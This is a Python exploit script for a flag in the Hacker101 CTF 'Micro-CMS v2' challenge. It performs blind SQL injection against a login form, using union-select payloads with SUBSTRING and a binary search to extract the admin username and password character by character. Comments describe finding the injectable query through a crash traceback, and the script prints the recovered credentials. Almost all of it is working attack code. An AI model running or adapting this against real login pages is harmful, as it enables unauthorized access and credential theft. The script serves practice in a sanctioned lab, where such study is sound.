#!/usr/bin/env python3

import requests
import sys
from urllib.parse import quote_plus


# https://ctf.hacker101.com/ctf
# This helps with one of the flags in "Micro-CMS v2" challenge.
# This reads the username/password from the admins table using a blind SQL technique.

# Using ZAP, I tampered with the posted login body and added %FF to the username
# and password and it crashed it returned this!
#
# Traceback (most recent call last):
# File "./main.py", line 145, in do_login
# if cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0:
# File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 233, in execute
# query = query.encode(db.encoding)
# UnicodeEncodeError: 'latin-1' codec can't encode character u'\ufffd' in position 45: ordinal not in range(256)
#
# This statement allows for SQL injection.  The implication is that, the password that is selected
# here is later compared with the password from the POST.




# Replace this with your instance URL
URL = 'http://34.94.3.143/261d48ec75/login'

def fatalError(msg):
    sys.exit("ERROR: " + msg)

def tryLogin(body):
    response = requests.post(URL,
                             data=body,
                             headers = {
                                 'Content-Type': 'application/x-www-form-urlencoded',
                             },
                             allow_redirects=False
                             )
    if response.status_code != 200:
        print(response.status_code)
        fatalError()

    if 'l2session' in response.cookies:
        return True
    else:
        return False


def probeColValueCharAtIndex2(colname, charIndex):

    lowGuessIndex = 33
    highGuessIndex = 126

    while lowGuessIndex < highGuessIndex:
        guessIndex = int(lowGuessIndex + (highGuessIndex - lowGuessIndex) / 2)
        guess = chr(guessIndex)
        encodedGuess = quote_plus(guess)

        # This is an injection against this python statement:
        # if cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0:

        # binary causes case sensitive string comparison
        body="username=a' union select 'A' password from admins where binary '" + encodedGuess + "' <= SUBSTRING(" + colname + ", " + str(charIndex) + ", 1); -- &password=A"

        # example body value:
        # username=a' union select 'A' password from admins where binary 'v' <= SUBSTRING(username, 1, 1); -- &password=A
        #
        # This mainly works because there is only one row in the 'admins' table and we are trying to obtain
        # the (username, password) column values from that row.

        if tryLogin(body):
            if lowGuessIndex == guessIndex:
                print("Char Index: " + str(charIndex) + ", value: " + guess)
                return guess
            lowGuessIndex = guessIndex
        else:
            highGuessIndex = guessIndex

    return False

def probeColValue2(colName):
    colValue = ''
    for charIndex in range(1, 100):
        char = probeColValueCharAtIndex2(colName, charIndex)
        if not char:
            break
        colValue += char

    print("Col: " + colName + ", value: " + colValue)


# Col: username, value: velia
probeColValue2('username')

# Col: password, value: terrence
probeColValue2('password')
